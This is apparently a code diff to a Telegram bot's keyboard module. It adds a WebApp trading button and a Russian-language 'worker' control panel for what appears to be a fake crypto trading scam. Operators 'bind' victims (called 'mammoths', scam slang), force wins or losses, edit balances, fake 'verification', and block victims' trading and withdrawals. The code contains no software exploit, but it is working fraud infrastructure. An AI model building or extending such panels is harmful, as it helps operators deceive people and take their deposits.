@@ -1,6 +1,7 @@
 from aiogram.utils.keyboard import InlineKeyboardBuilder
-from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
+from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
 import config
+from database.models import User
 
 
 def get_main_kb(kb_lang_data: dict) -> InlineKeyboardMarkup:
@@ -19,8 +20,11 @@ def get_trade_kb(kb_lang_data: dict, user_tg_id: str) -> InlineKeyboardMarkup:
     kb = InlineKeyboardBuilder()
     kb.row(InlineKeyboardButton(text='FAQ', callback_data='trade_faq'))
     kb.row(InlineKeyboardButton(text=lang_data['crypto'], 
-           url=f"{config.WEBHOOK_URL}:{config.WEBHOOK_PORT}/?\
-trade=BINANCE:BTCUSDT&id={user_tg_id}"))
+           web_app=WebAppInfo(
+#                url=f"{config.WEBHOOK_URL}:{config.WEBHOOK_PORT}/?\
+# trade=BINANCE:BTCUSDT&id={user_tg_id}"
+url='https://26992b44-696a-49cb-9850-9db0e8f9c850.tunnel4.com/?trade=BINANCE:BTCUSDT&id=123'
+)))
     kb.row(InlineKeyboardButton(text=lang_data['back'], callback_data='back'))
     return kb.as_markup()
 
@@ -91,4 +95,58 @@ def get_support_page_kb(kb_lang_data: dict) -> InlineKeyboardMarkup:
     kb = InlineKeyboardBuilder()
     kb.row(InlineKeyboardButton(text=lang_data['support'], url='https://google.com/'))
     kb.row(InlineKeyboardButton(text=lang_data['back'], callback_data='back'))
+    return kb.as_markup()
+
+
+###
+# Worker keyboards
+###
+
+def get_main_worker_kb():
+    kb = InlineKeyboardBuilder()
+    kb.button(text='Список пользователей', callback_data='worker_list')
+    kb.button(text='Рассылка', callback_data='worker_mailing')
+    kb.button(text='Привязать мамонта', callback_data='worker_bind')
+    kb.button(text='Мин.пополнение всем', callback_data='worker_min_deposit')
+    kb.button(text='Промокод', callback_data='worker_promocode')
+    kb.button(text='Задать валюту', callback_data='worker_set_currency')
+    kb.button(text='Мин.вывод', callback_data='worker_min_withdraw')
+    kb.button(text='Удалить всех', callback_data='worker_delete_all')
+    kb.adjust(1)
+    return kb.as_markup()
+
+def get_select_user_kb(users: list[User]):
+    kb = InlineKeyboardBuilder()
+    for user in users:
+        kb.button(text=user.tg_id, callback_data=f'worker_user_{user.tg_id}')
+    kb.button(text='Поиск', callback_data='worker_search')
+    kb.button(text='Назад', callback_data='worker_back')
+    kb.adjust(1)
+    return kb.as_markup()
+
+def get_user_managment_kb(user_id: str):
+    builder = InlineKeyboardBuilder()
+    builder.button(text='Обновить', callback_data=f'worker_user_{user_id}')
+    builder.button(text='Выигрыш', callback_data=f'worker_win_{user_id}')
+    builder.button(text='Прогрыш', callback_data=f'worker_lose_{user_id}')
+    builder.button(text='Рандом', callback_data=f'worker_random_{user_id}')
+    builder.button(text='Выдать верификацию', callback_data=f'worker_verif_{user_id}')
+    builder.button(text='Блокировать торги', callback_data=f'worker_block_{user_id}')
+    builder.button(text='Блокировать вывод', callback_data=f'worker_block_withdraw_{user_id}')
+    builder.button(text='Изменить баланс', callback_data=f'worker_change_balance_{user_id}')
+    builder.button(text='Добавить к балансу', callback_data=f'worker_add_balance_{user_id}')
+    builder.button(text='Максимальный баланс', callback_data=f'worker_max_balance_{user_id}')
+    builder.button(text='Минимальное пополнение', callback_data=f'worker_min_deposit_{user_id}')
+    builder.button(text='Написать', callback_data=f'worker_send_message_{user_id}')
+    builder.button(text='Мин.вывод', callback_data=f'worker_min_withdraw_{user_id}')
+    builder.button(text='Удалить мамонта', callback_data=f'worker_unbind_{user_id}')
+    builder.button(text='Заблокировать', callback_data=f'worker_block_{user_id}')
+    builder.button(text='Назад', callback_data='worker_back')
+    builder.adjust(1, 3, 1, 2, 2, 2, 1)
+    return builder.as_markup()
+
+
+def get_worker_menu_back_kb():
+    kb = InlineKeyboardBuilder()
+    kb.button(text='Назад', callback_data='worker_back')
     return kb.as_markup()
